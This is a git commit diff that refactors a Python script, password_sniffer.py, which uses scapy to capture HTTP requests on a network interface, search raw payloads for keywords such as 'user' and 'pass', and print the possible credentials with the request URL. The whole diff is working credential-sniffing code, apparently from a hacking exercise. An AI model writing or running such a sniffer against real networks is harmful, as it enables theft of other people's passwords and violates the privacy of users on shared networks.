7022eae6deaaca50b82d17ebd85c923b93d262ec
E1Adamov <psnasti@gmail.com>
2019-04-10 11:06:56 -0400

    refactor

--- password_sniffer.py
+++ password_sniffer.py
@@ -1,5 +1,5 @@
 import scapy.all as scapy
-from scapy_http import http
+from scapy_http.http import HTTPRequest
 # from scapy.layers import http
 
 
@@ -10,12 +10,13 @@ def sniff(interface):
 
 
 def get_url(packet):
-    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return packet[HTTPRequest].Host + packet[HTTPRequest].Path
 
 
 def get_login(packet):
     # packet[<layer_name>].<field_name>
-    load = packet.getlayer(scapy.Raw).load  # .decode(encoding='ascii', errors='ignore')
+    load = packet[scapy.Raw].load.decode(encoding='utf-8', errors='ignore')
+    # return load
 
     keywords = ('user', 'name', 'login', 'pass')
     for key in keywords:
@@ -24,13 +25,14 @@ def get_login(packet):
 
 
 def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
+    if packet.haslayer(HTTPRequest):
+
         # use scapy.<layer_name> for different layers
         if packet.haslayer(scapy.Raw):
             url = get_url(packet)
             login_info = get_login(packet)
             if login_info:
-                print(f'[+] Possbile password: {login_info}, "\n", [+] For URL: {url}')
+                print(f'[+] Possbile password: {login_info}, \n, [+] For URL: {url}')
 
 
 # use 'wlan0' for real LAN
